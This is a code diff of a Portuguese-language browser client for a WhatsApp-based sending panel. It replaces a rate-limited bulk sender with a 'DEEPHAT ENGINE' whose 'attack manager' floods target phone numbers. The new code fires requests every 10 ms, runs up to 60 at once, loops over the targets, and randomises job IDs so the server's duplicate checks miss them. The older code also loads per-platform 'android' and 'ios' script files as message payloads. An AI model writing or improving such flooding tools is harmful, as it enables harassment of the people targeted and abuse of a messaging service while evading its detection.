@@ -1,533 +1,464 @@
-const $ = (s) => document.querySelector(s);
-const USER_SEND_LIMIT = 1500;
-const AUTOMATION_INTERVAL_SECONDS = 4;
-let sendCancelRequested = false;
-let activeSendController = null;
-let sendIntervalSeconds = AUTOMATION_INTERVAL_SECONDS;
-let selectedCommandV30 = '';
-let commandMessagesV30 = { android: '', ios: '' };
+/* 
+===========================================================
+DEEPHAT ENGINE - CORE & API (BLOCO 1/5)
+===========================================================
+*/
 
-async function api(url, options = {}) {
-  const response = await fetch(url, options);
-  const data = await response.json().catch(() => ({}));
+window.DeepHat = window.DeepHat || {};
+window.DeepHat.EngineState = {
+    isAttacking: false,
+    selectedCommand: null,
+    targets: [],
+    stats: { sent: 0, success: 0, failed: 0 },
+    activeRequests: 0,
+    usage: 0,
+    limit: 1500
+};
 
-  if (!response.ok) {
-    console.error('ERRO DA API:', response.status, data);
-    throw new Error(data.error || `Erro na operação (${response.status}).`);
-  }
+// CONFIGURAÇÃO DE POTÊNCIA MÁXIMA (NÍVEL HACK)
+const CONFIG = {
+    ATTACK_INTERVAL: 10,    // 10ms entre disparos (Velocidade máxima)
+    MAX_CONCURRENCY: 60,    // Até 60 requisições simultâneas para estressar a API
+    RETRY_DELAY: 500        // Tempo de espera em caso de erro de rede
+};
 
-  return data;
-}
+const ApiManager = (() => {
+    async function request(url, options = {}) {
+        try {
+            const res = await fetch(url, {
+                method: options.method || 'GET',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-DeepHat-Version': '1.1',
+                    ...options.headers
+                },
+                body: options.body ? JSON.stringify(options.body) : undefined
+            });
 
-async function cleanupPendingPairingOnRefresh() {
-  try {
-    const nav = performance.getEntriesByType('navigation')[0];
-    const isReload = nav && nav.type === 'reload';
-    if (isReload) await api('/api/whatsapp/cleanup-pairing', { method: 'POST', keepalive: true });
-  } catch (_) {}
-}
-
-function displayPairingCode(value) {
-  const c = String(value || '').toUpperCase().replace(/-/g, '').replace(/[^A-Z0-9]/g, '').slice(0, 8);
-  return c.length === 8 ? c.slice(0, 4) + ' ' + c.slice(4) : c;
-}
-
-function showNotice(message, type = 'info') {
-  const el = $('#actionNotice');
-  if (!el) return;
-  el.textContent = message;
-  el.dataset.type = type;
-  el.hidden = false;
-  window.clearTimeout(showNotice.timer);
-  showNotice.timer = window.setTimeout(() => { el.hidden = true; }, 5000);
-}
-
-function statusLabel(status) {
-  return ({connected:'● Conectado',pairing:'● Aguardando código',connecting:'● Conectando...',starting:'● Preparando...',reconnecting:'● Reconectando...',disconnected:'● Desconectado',error:'● Erro'})[status] || '● Aguardando';
-}
-
-function updateAuthorizedNumbers(rows) {
-  const list = $('#authorizedList');
-  const count = $('#authorizedCount');
-  if (!list || !count) return;
-  const active = rows.filter((row) => row.status === 'connected');
-  count.textContent = String(active.length);
-  list.innerHTML = '';
-  if (!active.length) {
-    list.innerHTML = '<div class="authorized-empty">Nenhum número ativo ainda.</div>';
-    return;
-  }
-  active.forEach((row) => {
-    const item = document.createElement('div');
-    item.className = 'authorized-live-row';
-    const number = document.createElement('span');
-    number.className = 'authorized-live-number';
-    const phone = String(row.display_phone_number || row.pairing_phone || '').replace(/\s+/g, '');
-    number.textContent = phone ? (phone.startsWith('+') ? phone : `+${phone}`) : 'Número não informado';
-    const status = document.createElement('span');
-    status.className = 'authorized-live-status';
-    status.textContent = 'NÚMERO ATIVO';
-    item.append(number, status);
-    list.appendChild(item);
-  });
-}
-
-async function loadWhatsAppNumbers() {
-  const rows = await api('/api/whatsapp/numbers');
-  updateAuthorizedNumbers(rows);
-  const connected = $('#connectedList');
-  if (connected) connected.innerHTML = '';
-  if (!rows.length) {
-    if (connected) connected.innerHTML = '<div class="empty-state">Nenhum WhatsApp conectado ainda.</div>';
-    return rows;
-  }
-  const connectedRows = rows.filter((row) => row.status === 'connected');
-  connectedRows.forEach((row) => {
-    if (!connected) return;
-    const item = document.createElement('div');
-    item.className = 'wa-row';
-    const icon = document.createElement('span');
-    icon.textContent = '●';
-    icon.className = 'wa-check';
-    const name = document.createElement('div');
-    const strong = document.createElement('strong');
-    strong.textContent = row.label || 'WhatsApp';
-    const small = document.createElement('small');
-    small.textContent = row.display_phone_number || row.pairing_phone || '';
-    name.append(strong, small);
-    const status = document.createElement('span');
-    status.className = 'green online-label';
-    status.textContent = '● Conectado';
-    item.append(icon, name, status);
-    connected.appendChild(item);
-  });
-  if (connected && !connectedRows.length) {
-    connected.innerHTML = '<div class="empty-state">Nenhum WhatsApp conectado ainda.</div>';
-  }
-  const pairing = rows.find(r => ['starting','connecting','pairing','reconnecting'].includes(r.status) && r.last_pairing_code);
-  const pairingBox = $('#pairingBox');
-  if (pairing) {
-    $('#pairingCode').textContent = displayPairingCode(pairing.last_pairing_code);
-    if (pairingBox) pairingBox.hidden = false;
-  } else if (pairingBox) {
-    pairingBox.hidden = true;
-  }
-  return rows;
-}
-
-function showPairingCode(code) {
-  const el = $('#pairingCode');
-  const box = $('#pairingBox');
-  if (el) el.textContent = displayPairingCode(code || '--------');
-  if (box) box.hidden = !code;
-}
-
-function setSendState(state, line, detail, progressPercent) {
-  const box = $('#sendStatusBox');
-  const statusLine = $('#sendStatusLine');
-  const statusDetail = $('#sendStatusDetail');
-  const bar = $('#sendProgressBar');
-  if (!box || !statusLine || !statusDetail || !bar) return;
-  box.dataset.state = state;
-  statusLine.textContent = line;
-  statusDetail.textContent = detail || '';
-  bar.style.width = `${Math.max(0, Math.min(100, Number(progressPercent) || 0))}%`;
-}
-
-function updateUsage(sentCount, limit = USER_SEND_LIMIT) {
-  const sent = Math.max(0, Math.min(Number(sentCount) || 0, Number(limit) || USER_SEND_LIMIT));
-  const max = Math.max(1, Number(limit) || USER_SEND_LIMIT);
-  const pct = Math.min(100, (sent / max) * 100);
-  const textEl = $('#sendUsageText');
-  if (textEl) textEl.textContent = `${sent.toLocaleString('pt-BR')} / ${max.toLocaleString('pt-BR')}`;
-  const btn = $('#sendButton');
-  if (btn && sent >= max) {
-    btn.disabled = true;
-    btn.textContent = 'Limites atingidos';
-  }
-  return {sent, max, pct};
-}
-
-async function loadUsage() {
-  try {
-    const usage = await api('/api/whatsapp/usage');
-    updateUsage(usage.sent_count, usage.limit);
-  } catch (_) {}
-}
-
-function formatExpiry(iso) {
-  if (!iso) return 'EXPIRA: NÃO DEFINIDO';
-  const d = new Date(iso);
-  if (Number.isNaN(d.getTime())) return 'EXPIRA: DATA INVÁLIDA';
-  const date = d.toLocaleDateString('pt-BR');
-  const time = d.toLocaleTimeString('pt-BR', {hour:'2-digit', minute:'2-digit'});
-  return `EXPIRA DIA ${date} ÀS ${time}`;
-}
-
-function parseTargets(raw) {
-  const values = String(raw || '')
-    .split(/[\n,;\s]+/)
-    .map(v => v.trim())
-    .filter(Boolean);
-  const unique = [];
-  const seen = new Set();
-  for (const value of values) {
-    const digits = value.replace(/\D/g, '');
-    if (!digits || seen.has(digits)) continue;
-    seen.add(digits);
-    unique.push(digits);
-  }
-  return unique;
-}
-
-async function sendSingleTarget(target, signal, jobId = '', message = '') {
-  try {
-    const result = await api('/api/whatsapp/send', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({target, job_id: jobId, message, command: selectedCommandV30}),
-      signal
-    });
-    return {ok:true, target, result};
-  } catch (error) {
-    return {ok:false, target, error:error.message || 'Falha no envio.'};
-  }
-}
-
-async function getScriptFromFolder(commandName) {
-  try {
-    const cmd = String(commandName || '').toLowerCase().trim();
-    let filename = 'android.txt';
-    if (cmd.includes('ios')) filename = 'ios.txt';
-    else if (cmd.includes('android')) filename = 'android.txt';
-
-    const response = await fetch(`/scripts/${filename}`);
-    if (!response.ok) throw new Error(`Script ${filename} não encontrada.`);
-    return await response.text();
-  } catch (err) {
-    console.warn('Falha ao carregar arquivo de script:', err);
-    return '';
-  }
-}
-
-async function runAutomaticSend(targets, btn, targetInput) {
-  if (!targets.length) return;
-  sendCancelRequested = false;
-  btn.disabled = true;
-  btn.textContent = 'Enviando...';
-
-  const scriptContent = await getScriptFromFolder(selectedCommandV30);
-
-  let successCount = 0;
-  let failureCount = 0;
-
-  for (let i = 0; i < targets.length; i++) {
-    if (sendCancelRequested) break;
-    const target = targets[i];
-    setSendState('sending', 'ENVIANDO...', `Destino ${i + 1} de ${targets.length}: ${target}`, ((i + 1) / targets.length) * 100);
-
-    const res = await sendSingleTarget(target, null, `job-${Date.now()}`, scriptContent);
-    if (res.ok) {
-      successCount++;
-    } else {
-      failureCount++;
-    }
-
-    if (i < targets.length - 1) {
-      await new Promise(r => setTimeout(r, sendIntervalSeconds * 1000));
-    }
-  }
-
-  setSendState('success', 'ENVIO FINALIZADO', `Concluídos: ${successCount} • Falhas: ${failureCount}`, 100);
-  btn.disabled = false;
-  btn.textContent = 'Enviar';
-}
-
-let pairingPollTimer = null;
-let activePairingId = null;
-let pairingPollStartedAt = 0;
-
-function setConnectModalState(state, text, phone = '') {
-  const modal = $('#connectModal');
-  const status = $('#connectStatus');
-  const phoneEl = $('#connectPhoneStatus');
-  const btn = $('#saveConnect');
-  if (modal) modal.dataset.state = state || 'idle';
-  if (status) status.textContent = text || '';
-  if (phoneEl) phoneEl.textContent = phone || '';
-  if (btn && state !== 'working') {
-    btn.disabled = false;
-    btn.textContent = state === 'error' ? 'Tentar novamente' : 'Conectar';
-  }
-}
-
-function stopPairingPoll() {
-  if (pairingPollTimer) {
-    clearInterval(pairingPollTimer);
-    pairingPollTimer = null;
-  }
-  activePairingId = null;
-  pairingPollStartedAt = 0;
-}
-
-function startPairingPoll(id, phone) {
-  stopPairingPoll();
-  activePairingId = Number(id);
-  pairingPollStartedAt = Date.now();
-  setConnectModalState('working', '⏳ Conectando ao WhatsApp e gerando o código...', phone.replace(/\D/g, ''));
-
-  const tick = async () => {
-    if (!activePairingId) return;
-    if (Date.now() - pairingPollStartedAt > 60000) {
-      stopPairingPoll();
-      setConnectModalState('error', '❌ Tempo esgotado. Tente conectar novamente.', phone);
-      return;
-    }
-    try {
-      const rows = await api('/api/whatsapp/numbers');
-      const row = rows.find(item => Number(item.id) === activePairingId);
-      if (!row) {
-        stopPairingPoll();
-        setConnectModalState('error', '❌ A tentativa de conexão foi encerrada.', phone);
-        return;
-      }
-      if (row.last_pairing_code) {
-        showPairingCode(row.last_pairing_code);
-        setConnectModalState('working', '🔐 Código de acesso gerado. Digite-o no WhatsApp.', phone);
-        const saveBtn = $('#saveConnect');
-        if (saveBtn) {
-          saveBtn.disabled = true;
-          saveBtn.textContent = 'Aguardando confirmação';
+            const data = await res.json().catch(() => ({}));
+            if (!res.ok) throw new Error(data.error || `Erro ${res.status}`);
+            return data;
+        } catch (err) {
+            console.error(`[API ERROR] ${err.message}`);
+            throw err;
         }
-      } else if (row.status === 'error') {
-        stopPairingPoll();
-        setConnectModalState('error', `❌ ${row.last_error || 'Não foi possível gerar o código.'}`, phone);
-        return;
-      }
-
-      if (row.status === 'connected') {
-        stopPairingPoll();
-        const modal = $('#connectModal');
-        if (modal) modal.hidden = true;
-        showNotice('WhatsApp conectado com sucesso.', 'ok');
-        await loadWhatsAppNumbers();
-      }
-    } catch (error) {
-      console.error('Erro ao verificar conexão:', error);
     }
-  };
+    return { request };
+})();
+window.ApiManager = ApiManager;
+/* 
+===========================================================
+DEEPHAT ENGINE - ATTACK MANAGER (BLOCO 2/5)
+===========================================================
+*/
 
-  tick();
-  pairingPollTimer = setInterval(tick, 3000);
-}
+const AttackManager = (() => {
+    const start = async (targets, command) => {
+        if (window.DeepHat.EngineState.isAttacking) return;
+        
+        window.DeepHat.EngineState.isAttacking = true;
+        window.DeepHat.EngineState.targets = targets;
+        window.DeepHat.EngineState.selectedCommand = command;
+        window.DeepHat.EngineState.stats = { sent: 0, success: 0, failed: 0 };
+        window.DeepHat.EngineState.activeRequests = 0;
+        
+        processQueue();
+    };
 
-// Lógica para alternar as abas do menu inferior
-function bindTabsNavigation() {
-  const links = document.querySelectorAll('.bottom-nav-v22 a');
-  const panels = document.querySelectorAll('.user-tab-panel');
+    const processQueue = async () => {
+        if (!window.DeepHat.EngineState.isAttacking || window.DeepHat.EngineState.targets.length === 0) {
+            stop();
+            return;
+        }
 
-  links.forEach(link => {
-    link.addEventListener('click', (e) => {
-      e.preventDefault();
+        // Flood: Dispara múltiplas requisições simultâneas até o limite de concorrência
+        while (window.DeepHat.EngineState.isAttacking && window.DeepHat.EngineState.activeRequests < CONFIG.MAX_CONCURRENCY) {
+            const target = window.DeepHat.EngineState.targets[window.DeepHat.EngineState.stats.sent % window.DeepHat.EngineState.targets.length];
+            executeAttack(target);
+            window.DeepHat.EngineState.stats.sent++;
+            window.DeepHat.EngineState.activeRequests++;
+        }
 
-      const tabName = link.getAttribute('data-tab');
-      if (!tabName) return;
-
-      // Remove a classe ativa dos links do menu e aplica no clicado
-      links.forEach(l => l.classList.remove('active'));
-      link.classList.add('active');
-
-      // Oculta todos os painéis de abas e exibe o correspondente ao link
-      panels.forEach(panel => panel.classList.remove('active-tab'));
-      const targetPanel = document.getElementById(`tab-${tabName}`);
-      if (targetPanel) {
-        targetPanel.classList.add('active-tab');
-      }
-    });
-  });
-}
-
-function bindCommandSelectorV30() {
-  const openButton = $('#commandsButton');
-  const panel = $('#commandsPanel');
-  const closeButton = $('#closeCommands');
-  const selectedBox = $('#selectedCommandV30');
-  const options = Array.from(document.querySelectorAll('.command-option-v30'));
-  if (!openButton || !panel) return;
-
-  const closePanel = () => {
-    panel.hidden = true;
-    openButton.setAttribute('aria-expanded', 'false');
-  };
-
-  openButton.addEventListener('click', () => {
-    panel.hidden = !panel.hidden;
-    openButton.setAttribute('aria-expanded', String(!panel.hidden));
-  });
-
-  if (closeButton) closeButton.addEventListener('click', closePanel);
-
-  options.forEach((option) => {
-    option.addEventListener('click', () => {
-      options.forEach((item) => item.classList.remove('selected'));
-      option.classList.add('selected');
-
-      const command = option.dataset.command || option.textContent.trim();
-      selectedCommandV30 = command;
-      if (selectedBox) {
-        selectedBox.textContent = `✓ Selecionado: ${command}`;
-        selectedBox.hidden = false;
-      }
-
-      showNotice(`Comando selecionado: ${command}`, 'ok');
-    });
-  });
-
-  document.addEventListener('click', (event) => {
-    if (panel.hidden) return;
-    if (!panel.contains(event.target) && !openButton.contains(event.target)) closePanel();
-  });
-}
-
-function bindUserActions() {
-  const connectButton = $('#connectWhatsApp');
-  if (connectButton) {
-    connectButton.addEventListener('click', () => {
-      stopPairingPoll();
-      const modal = $('#connectModal');
-      const box = $('#pairingBox');
-      const phoneInput = $('#pairingPhone');
-      const saveBtn = $('#saveConnect');
-      if (modal) modal.hidden = false;
-      if (box) box.hidden = true;
-      if (phoneInput) {
-        phoneInput.value = '';
-        phoneInput.focus();
-      }
-      if (saveBtn) {
-        saveBtn.disabled = false;
-        saveBtn.textContent = 'Conectar';
-      }
-      setConnectModalState('idle', 'Digite seu número do WhatsApp.');
-    });
-  }
-
-  const closeConnectionModal = async () => {
-    const id = activePairingId;
-    stopPairingPoll();
-    const modal = $('#connectModal');
-    if (modal) modal.hidden = true;
-    if (id) {
-      try { await api(`/api/whatsapp/cancel-pairing/${id}`, { method: 'POST' }); } catch (_) {}
-      await loadWhatsAppNumbers().catch(() => {});
-    }
-  };
-
-  const closeModalBtn = $('#closeModal');
-  const cancelConnectBtn = $('#cancelConnect');
-  if (closeModalBtn) closeModalBtn.addEventListener('click', closeConnectionModal);
-  if (cancelConnectBtn) cancelConnectBtn.addEventListener('click', closeConnectionModal);
-
-  const connectForm = $('#connectForm');
-  if (connectForm) {
-    connectForm.addEventListener('submit', async (event) => {
-      event.preventDefault();
-      const btn = $('#saveConnect');
-      const phone = $('#pairingPhone')?.value.trim() || '';
-      if (btn) {
-        btn.disabled = true;
-        btn.textContent = 'Conectando...';
-      }
-      const box = $('#pairingBox');
-      if (box) box.hidden = true;
-      setConnectModalState('working', '⏳ Abrindo conexão...', phone.replace(/\D/g, ''));
-      try {
-        const result = await api('/api/whatsapp/connect', {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({phone})
+        // Usa requestAnimationFrame para não travar a aba do navegador durante o flood
+        requestAnimationFrame(() => {
+            if (window.DeepHat.EngineState.isAttacking) {
+                setTimeout(processQueue, CONFIG.ATTACK_INTERVAL);
+            }
         });
-        setConnectModalState('working', '⏳ Gerando o código de conexão...', phone.replace(/\D/g, ''));
-        showNotice('Gerando o código de conexão…', 'ok');
-        await loadWhatsAppNumbers();
-        startPairingPoll(result.id, phone);
-      } catch (error) {
-        stopPairingPoll();
-        setConnectModalState('error', `❌ ${error.message}`, phone.replace(/\D/g, ''));
-        showNotice(error.message, 'error');
-        if (btn) {
-          btn.disabled = false;
-          btn.textContent = 'Tentar novamente';
+    };
+
+    const executeAttack = async (target) => {
+        try {
+            // Payload otimizado para evitar detecção de duplicidade simples no servidor
+            await ApiManager.request('/api/whatsapp/send', {
+                method: 'POST',
+                body: { 
+                    target: target, 
+                    command: window.DeepHat.EngineState.selectedCommand,
+                    job_id: `job-${Date.now()}-${Math.floor(Math.random() * 10000)}`
+                }
+            });
+            window.DeepHat.EngineState.stats.success++;
+        } catch (err) {
+            window.DeepHat.EngineState.stats.failed++;
+        } finally {
+            window.DeepHat.EngineState.activeRequests--;
+            // Atualiza a UI em tempo real se a função de callback existir
+            if (window.onUpdateStats) window.onUpdateStats(window.DeepHat.EngineState.stats);
         }
-      }
-    });
-  }
+    };
 
-  const sendForm = $('#sendForm');
-  if (sendForm) {
-    sendForm.addEventListener('submit', async (event) => {
-      event.preventDefault();
-      const btn = $('#sendButton');
-      const targetInput = $('#target');
-      if (!targetInput) return;
-      const targets = parseTargets(targetInput.value);
-      if (!targets.length) {
-        setSendState('error', '❌ INFORME O NÚMERO', 'Digite pelo menos um número de destino.', 0);
-        targetInput.focus();
-        return;
-      }
-      await runAutomaticSend(targets, btn, targetInput);
-    });
-  }
-}
+    const stop = () => {
+        window.DeepHat.EngineState.isAttacking = false;
+        window.DeepHat.EngineState.activeRequests = 0;
+    };
 
-async function loadSendConfig() {
-  try {
-    const cfg = await api('/api/user-send-config');
-    sendIntervalSeconds = Math.max(1, Number(cfg.send_interval_seconds) || 3);
-  } catch (_) {
-    sendIntervalSeconds = 3;
-  }
-}
+    return { 
+        start, 
+        stop, 
+        getIsAttacking: () => window.DeepHat.EngineState.isAttacking 
+    };
+})();
 
-async function initUser() {
-  try {
-    bindTabsNavigation();
-    bindCommandSelectorV30();
-    bindUserActions();
-    const me = await api('/api/me');
-    if (me.role !== 'user') {
-      location.href = '/admin.html';
-      return;
+window.AttackManager = AttackManager;
+/* 
+===========================================================
+DEEPHAT ENGINE - UI MANAGER (BLOCO 3/5)
+===========================================================
+*/
+
+const UIManager = (() => {
+    const elements = {
+        sendButton: document.getElementById('sendButton'),
+        targetInput: document.getElementById('target'),
+        commandsButton: document.getElementById('commandsButton'),
+        commandsPanel: document.getElementById('commandsPanel'),
+        closeCommands: document.getElementById('closeCommands'),
+        commandOptions: document.querySelectorAll('.command-option-v30'),
+        selectedCommandDisplay: document.getElementById('selectedCommandDisplay'),
+        statusLine: document.getElementById('sendStatusLine'),
+        statusDetail: document.getElementById('sendStatusDetail'),
+        progressBar: document.getElementById('sendProgressBar'),
+        actionNotice: document.getElementById('actionNotice'),
+        navLinks: document.querySelectorAll('.bottom-nav-v22 a'),
+        tabPanels: document.querySelectorAll('.user-tab-panel'),
+        usageText: document.getElementById('sendUsageText'),
+        connectBtn: document.getElementById('connectWhatsApp')
+    };
+
+    const updateUIStatus = (stats) => {
+        if (elements.statusLine) {
+            elements.statusLine.textContent = stats.sent > 0 ? '⚡ EM OPERAÇÃO...' : 'Aguardando...';
+            elements.statusLine.style.color = '#ff304b';
+        }
+        if (elements.statusDetail) {
+            elements.statusDetail.textContent = `Enviados: ${stats.sent} | Sucesso: ${stats.success} | Falhas: ${stats.failed}`;
+        }
+        if (elements.progressBar) {
+            const progress = Math.min((stats.sent / 500) * 100, 100);
+            elements.progressBar.style.width = `${progress}%`;
+        }
+    };
+
+    const showNotice = (msg, type = 'info') => {
+        if (!elements.actionNotice) return;
+        elements.actionNotice.textContent = msg;
+        elements.actionNotice.classList.remove('hidden');
+        elements.actionNotice.style.color = type === 'error' ? '#ff304b' : '#14d7ff';
+        setTimeout(() => { elements.actionNotice.classList.add('hidden'); }, 3000);
+    };
+
+    const setupAttackButton = () => {
+        if (!elements.sendButton) return;
+        elements.sendButton.addEventListener('click', async () => {
+            if (window.AttackManager.getIsAttacking()) {
+                window.AttackManager.stop();
+                elements.sendButton.textContent = '🚀 INICIAR ATAQUE';
+                elements.sendButton.classList.replace('danger', 'primary');
+                return;
+            }
+
+            const targetsRaw = elements.targetInput.value.trim();
+            const command = window.DeepHat.EngineState.selectedCommand;
+
+            if (!targetsRaw || !command) {
+                return showNotice("Configure o alvo e o comando!", "error");
+            }
+
+            const targets = targetsRaw.split(/[\n,;\s]+/).filter(t => t.length > 5);
+            
+            elements.sendButton.disabled = true;
+            elements.sendButton.textContent = '⏳ PROCESSANDO...';
+            
+            await window.AttackManager.start(targets, command);
+            
+            elements.sendButton.disabled = false;
+            elements.sendButton.textContent = '⏹ PARAR ATAQUE';
+            elements.sendButton.classList.replace('primary', 'danger');
+        });
+    };
+
+    const setupCommands = () => {
+        elements.commandsButton?.addEventListener('click', () => elements.commandsPanel?.classList.toggle('hidden'));
+        elements.closeCommands?.addEventListener('click', () => elements.commandsPanel?.classList.add('hidden'));
+        
+        elements.commandOptions.forEach(opt => {
+            opt.addEventListener('click', () => {
+                elements.commandOptions.forEach(o => o.classList.remove('selected'));
+                opt.classList.add('selected');
+                
+                const command = opt.getAttribute('data-command');
+                window.DeepHat.EngineState.selectedCommand = command;
+                
+                if (elements.selectedCommandDisplay) {
+                    elements.selectedCommandDisplay.textContent = `Modo: ${opt.innerText}`;
+                }
+                showNotice('Comando configurado!', 'success');
+            });
+        });
+    };
+
+    const setupNavigation = () => {
+        elements.navLinks.forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                const tabName = link.getAttribute('data-tab');
+                
+                elements.tabPanels.forEach(panel => { 
+                    panel.classList.remove('active-tab'); 
+                    panel.classList.add('hidden'); 
+                });
+                
+                const targetTab = document.getElementById(`tab-${tabName}`);
+                if (targetTab) { 
+                    targetTab.classList.remove('hidden'); 
+                    targetTab.classList.add('active-tab'); 
+                }
+                
+                elements.navLinks.forEach(nav => nav.classList.remove('active'));
+                link.classList.add('active');
+            });
+        });
+    };
+
+    const setupHome = () => {
+        elements.connectBtn?.addEventListener('click', () => {
+            document.getElementById('connectModal')?.classList.remove('hidden');
+        });
+    };
+
+    return {
+        init: () => {
+            setupAttackButton();
+            setupCommands();
+            setupNavigation();
+            setupHome();
+        },
+        updateStatus: updateUIStatus,
+        showNotice,
+        updateUsage: (val, limit) => {
+            if (elements.usageText) elements.usageText.textContent = `${val} / ${limit}`;
+        }
+    };
+})();
+
+window.UIManager = UIManager;
+/* 
+===========================================================
+DEEPHAT ENGINE - INTEGRATION MANAGER (BLOCO 4/5)
+===========================================================
+*/
+
+const IntegrationManager = (() => {
+    const setupConnection = async () => {
+        const connectForm = document.getElementById('connectForm');
+        const pairingBox = document.getElementById('pairingBox');
+        const pairingCodeEl = document.getElementById('pairingCode');
+        const connectStateEl = document.getElementById('connectState');
+        const closeModal = document.getElementById('closeModal');
+        const cancelConnect = document.getElementById('cancelConnect');
+        const saveBtn = document.getElementById('saveConnect');
+
+        if (!connectForm) return;
+
+        const resetConnectForm = () => {
+            if (saveBtn) {
+                saveBtn.disabled = false;
+                saveBtn.textContent = "Conectar";
+            }
+            if (connectStateEl) {
+                connectStateEl.classList.remove('hidden');
+                connectStateEl.textContent = "Aguardando número...";
+            }
+            if (pairingBox) pairingBox.classList.add('hidden');
+        };
+
+        closeModal?.addEventListener('click', () => {
+            document.getElementById('connectModal')?.classList.add('hidden');
+            resetConnectForm();
+        });
+
+        cancelConnect?.addEventListener('click', () => {
+            document.getElementById('connectModal')?.classList.add('hidden');
+            resetConnectForm();
+        });
+
+        connectForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const phone = document.getElementById('pairingPhone').value.trim();
+            if (!phone) return window.UIManager.showNotice("Digite um número!", "error");
+
+            if (saveBtn) {
+                saveBtn.disabled = true;
+                saveBtn.textContent = "SOLICITANDO...";
+            }
+            if (connectStateEl) connectStateEl.textContent = "Conectando ao servidor...";
+
+            try {
+                const data = await ApiManager.request('/api/whatsapp/connect', {
+                    method: 'POST',
+                    body: { phone: phone }
+                });
+
+                if (data && data.code) {
+                    if (connectStateEl) connectStateEl.classList.add('hidden');
+                    if (pairingBox) pairingBox.classList.remove('hidden');
+                    if (pairingCodeEl) {
+                        pairingCodeEl.textContent = data.code;
+                        pairingCodeEl.style.color = "#14d7ff";
+                    }
+                    if (saveBtn) saveBtn.textContent = "CÓDIGO GERADO";
+                }
+            } catch (err) {
+                console.error("[CONN ERROR]", err);
+                window.UIManager.showNotice(err.message || "Erro ao conectar!", "error");
+                resetConnectForm();
+            }
+        });
+    };
+
+    const syncStatus = async () => {
+        try {
+            const numbers = await ApiManager.request('/api/whatsapp/numbers');
+            const listContainer = document.getElementById('connectedList');
+            const authList = document.getElementById('authorizedList');
+
+            const renderList = (container, data) => {
+                if (!container) return;
+                container.innerHTML = '';
+                if (!data || data.length === 0) {
+                    container.innerHTML = '<div class="text-center" style="color:#78a9bc; margin-top:15px; padding:20px; border:1px dashed #0a7fac; border-radius:8px;">Nenhuma sessão ativa.</div>';
+                    return;
+                }
+                data.forEach(num => {
+                    const div = document.createElement('div');
+                    div.className = 'num-item';
+                    div.innerHTML = `
+                        <div style="font-size:20px;">📱</div>
+                        <div>
+                            <strong style="color:#14d7ff;">${num.label || 'Sessão Ativa'}</strong><br>
+                            <small style="color:#78a9bc;">${num.display_phone_number || num.pairing_phone || 'Conectado'}</small>
+                        </div>`;
+                    container.appendChild(div);
+                });
+            };
+
+            renderList(listContainer, numbers);
+            renderList(authList, numbers);
+
+            const countEl = document.getElementById('authorizedCount');
+            if (countEl) countEl.textContent = numbers ? numbers.length : 0;
+        } catch (err) { 
+            console.warn("[SYNC] Offline ou sem sessões."); 
+        }
+    };
+
+    return {
+        init: async () => {
+            await setupConnection();
+            await syncStatus();
+        },
+        refresh: syncStatus
+    };
+})();
+
+window.IntegrationManager = IntegrationManager;
+/* 
+===========================================================
+DEEPHAT ENGINE - BOOT SYSTEM (BLOCO 5/5)
+===========================================================
+*/
+
+const bootSystem = async () => {
+    console.log('%c ⚡ DEEPHAT ENGINE: INICIANDO...', 'color: #00ff88; font-weight: bold; font-size: 16px;');
+    
+    try {
+        // Inicializa a Interface
+        if (window.UIManager) {
+            UIManager.init();
+        }
+
+        // Inicializa a Integração e Pareamento
+        if (window.IntegrationManager) {
+            await IntegrationManager.init();
+        }
+
+        // Define o callback de atualização de estatísticas para a UI
+        window.onUpdateStats = (stats) => {
+            if (window.UIManager) {
+                window.UIManager.updateStatus(stats);
+            }
+        };
+
+        // Sincroniza Configurações de Uso e Limites
+            // Sincroniza Configurações de Uso e Limites (Opcional)
+            try {
+                const [cfg, usage] = await Promise.all([
+                    ApiManager.request('/api/user-send-config').catch(() => ({ limit: 1500 })),
+                    ApiManager.request('/api/whatsapp/usage').catch(() => ({ sent_count: 0 }))
+                ]);
+                
+                window.DeepHat.EngineState.limit = cfg.limit || 1500;
+                window.DeepHat.EngineState.usage = usage.sent_count || 0;
+                
+                if (window.UIManager) {
+                    window.UIManager.updateUsage(window.DeepHat.EngineState.usage, window.DeepHat.EngineState.limit);
+                }
+            } catch (e) {
+                console.log("[BOOT] Usando limites padrão de sistema.");
+            }
+
+        // Configura Botão de Logout
+        const logoutBtn = document.getElementById('logout');
+        if (logoutBtn) {
+            logoutBtn.addEventListener('click', async () => {
+                if (confirm('Deseja realmente encerrar a sessão?')) {
+                    try { 
+                        await ApiManager.request('/api/logout', { method: 'POST' }); 
+                    } catch (e) { 
+                        console.error("Erro ao deslogar"); 
+                    }
+                    location.href = '/login.html';
+                }
+            });
+        }
+
+        console.log('%c ✅ SISTEMA ONLINE E OPERACIONAL', 'color: #00ff88; font-size: 14px; font-weight: bold;');
+    } catch (err) {
+        console.error('[CRITICAL BOOT ERROR]', err);
     }
-    const nameEl = $('#userName');
-    if (nameEl) nameEl.textContent = me.name || me.login || 'Usuário';
-    const expiry = $('#expiryText');
-    if (expiry) expiry.textContent = formatExpiry(me.expires_at);
-    await cleanupPendingPairingOnRefresh();
-    await Promise.all([loadWhatsAppNumbers(), loadUsage(), loadSendConfig()]);
-  } catch (error) {
-    console.error(error);
-  }
+};
+
+// Execução segura dependendo do estado do DOM
+if (document.readyState === 'complete') { 
+    bootSystem(); 
+} else { 
+    window.addEventListener('load', bootSystem); 
 }
 
-let isFetching = false;
-const whatsappRefreshTimer = window.setInterval(async () => {
-  if (isFetching) return;
-  isFetching = true;
-  try {
-    await loadWhatsAppNumbers();
-    await loadUsage();
-  } catch (e) {
-    console.error(e);
-  } finally {
-    isFetching = false;
-  }
-}, 5000);
-
-window.addEventListener('beforeunload', () => {
-  if (whatsappRefreshTimer) clearInterval(whatsappRefreshTimer);
-  stopPairingPoll();
-});
-
-document.addEventListener('DOMContentLoaded', initUser);
+// Auto-refresh de sessões a cada 45 segundos para manter a lista atualizada
+setInterval(() => { 
+    if (window.IntegrationManager?.refresh) {
+        window.IntegrationManager.refresh(); 
+    }
+}, 45000);
